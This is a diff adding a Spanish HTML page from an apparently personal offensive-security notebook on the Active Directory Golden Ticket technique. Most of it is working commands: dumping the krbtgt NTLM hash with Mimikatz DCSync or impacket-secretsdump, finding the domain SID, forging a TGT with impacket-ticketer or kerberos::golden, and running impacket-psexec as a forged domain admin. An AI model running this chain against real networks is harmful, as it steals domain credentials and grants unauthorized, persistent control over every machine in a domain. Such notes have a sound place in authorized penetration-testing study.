@@ -1,0 +1,115 @@
+<!doctype html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="/favicon-monkey.png?v=20260601" />
+    <title>Golden Ticket (TGT) | Notebook</title>
+    <script src="/theme.js"></script>
+    <link rel="stylesheet" href="/section.css" />
+  </head>
+  <body>
+    <main class="section-shell notebook-shell">
+      <a class="back-link" href="/notebook.html">~/notebook</a>
+
+      <section class="notebook-workspace" aria-label="Notebook">
+        <aside class="notebook-sidebar" aria-label="Explorador de apuntes" data-notebook-index></aside>
+
+        <article class="note-panel is-active" id="golden-ticket-tgt">
+          <div class="note-tabbar">
+            <span>Golden Ticket (TGT)</span>
+            <details class="notebook-tag-search">
+              <summary>Buscar tags</summary>
+              <label>
+                <span>Tags de apuntes</span>
+                <input class="notebook-search-input" type="search" placeholder="Busca por herramienta, técnica o tag del apunte" autocomplete="off" />
+              </label>
+              <div class="notebook-search-results" aria-live="polite"></div>
+            </details>
+            <span>~/notebook/Active Directory/Persistencia</span>
+          </div>
+
+          <div class="note-content">
+            <p class="eyebrow">active directory / persistencia</p>
+            <h2>Golden Ticket (TGT)</h2>
+
+            <p>Golden Ticket permite crear TGTs arbitrarios si se dispone del hash de krbtgt y el SID del dominio.</p>
+
+            <p><span class="notebook-review-note">Aviso: <code>Kerberos Golden Ticket</code> permite crear tickets <code>TGT</code> de cualquier usuario del dominio y actuar como un DC</span></p>
+            <p>- <code>Requisitos</code>: hash NTLM de  <code>krbtgt</code> y <code>SID del dominio</code></p>
+            <h2>hash krbtgt</h2>
+            <section class="code-card">
+              <h3>Windows Mimikatz: Dumpear hash de krbtgt</h3>
+              <pre><code>mimikatz.exe
+lsadump::dcsync /domain:&lt;domain&gt;.&lt;domain&gt; /user:krbtgt
+# hash NTLM krbtgt: krbtgt:rid:LM:NT -&gt; Necesitamos el hash NT</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Dumpear hash de krbtgt</h3>
+              <pre><code>impacket-secretsdump &lt;user&gt;:&lt;pass&gt;@&lt;ip_dc&gt; -just-dc-ntlm
+# hash NTLM krbtgt: krbtgt:rid:LM:NT -&gt; Necesitamos el hash NT</code></pre>
+            </section>
+            <h2>Enumerar SID del dominio</h2>
+            <section class="code-card">
+              <h3>Windows: Enumerar SID del dominio</h3>
+              <pre><code>. .\PowerView.ps1
+Get-DomainSID
+# SID: S-1-5-21-1518138621-4282902758-752445584</code></pre>
+            </section>
+            <section class="code-card">
+              <h3>Kali: Enumerar SID del dominio</h3>
+              <pre><code># Impacket
+impacket-lookupsid &lt;user&gt;:&lt;pass&gt;@&lt;ip_dc&gt; | grep &quot;Domain SID&quot;
+# Netexec
+nxc ldap &lt;ip_dc&gt; -u &lt;user&gt; -p &lt;pass&gt; --get-sid
+# SID: S-1-5-21-1518138621-4282902758-752445584</code></pre>
+            </section>
+            <h2>Crear Ticket</h2>
+            <section class="code-card">
+              <h3>Crear ticket TGT</h3>
+              <pre><code># Poner user_random un usuario que no exista o Administrator (Dominio solo válida tickets y no valida usuarios)
+impacket-ticketer -nthash &lt;hash_krbtgt&gt; -domain-sid &lt;SID&gt; -domain &lt;dominio&gt; &lt;user_random&gt;
+# Se genera el ticket &lt;user_random&gt;.ccache y exportamos el ticket a la variable de entorno
+export KRB5CCNAME=/home/path_to/&lt;user_random&gt;.ccache
+# Conexión a todos los sistemas sin contraseña (Domain Admin) con los parámetros -k -no-pass
+impacket-psexec &lt;dominio&gt;/&lt;user_random&gt;@&lt;ip_dc&gt; -k -no-pass
+impacket-psexec &lt;dominio&gt;/&lt;user_random&gt;@&lt;ip_serv01&gt; -k -no-pass</code></pre>
+            </section>
+            <p><a href="https://www.youtube.com/watch?v=nzIn1BovE-Q">Explicación Golden Ticket</a></p>
+            <section class="code-card">
+              <h3>Crear ticket para la cuenta de Administrator</h3>
+              <pre><code>mimikatz.exe
+kerberos::golden /domain:&lt;domain&gt;.&lt;domain&gt; /sid:&lt;SID&gt; /rc4:&lt;hash_krbtgt&gt; /user:Administrator /id:500 /renewmax:7 /endin:8 /ptt
+
+# Listar Ticket en la sesión actual
+klist</code></pre>
+            </section>
+            <p>- <code>/domain</code>:El nombre del dominio.</p>
+            <p>- <code>/sid</code>:El valor SID del dominio.</p>
+            <p>- <code>/rc4</code>:El hash de la contraseña de <code>krbtgt</code>.</p>
+            <p>- <code>/user</code>:El nombre de usuario para el cual se emitirá el ticket</p>
+            <p>- <code>/id</code>:ID relativo (última parte de <code>SID</code>) del usuario para quien se emitirá el ticket.</p>
+            <p>- <code>/renewmax</code>:El número máximo de días que se puede renovar el ticket.</p>
+            <p>- <code>/endin</code>:Fin de la vida útil del ticket.</p>
+            <p>- <code>/ptt</code>: Pasa el Ticket a la sesión actual</p>
+
+            <h2>Tags</h2>
+            <div class="tag-list">
+              <span>ad</span>
+              <span>active_directory</span>
+              <span>persistencia</span>
+              <span>golden_ticket</span>
+              <span>tgt</span>
+              <span>krbtgt</span>
+              <span>ccache</span>
+              <span>ticketer</span>
+            </div>
+          </div>
+        </article>
+      </section>
+    </main>
+    <script src="/notebook/index.js"></script>
+    <script src="/notebook/folder-state.js"></script>
+    <script src="/notebook/search.js"></script>
+  </body>
+</html>
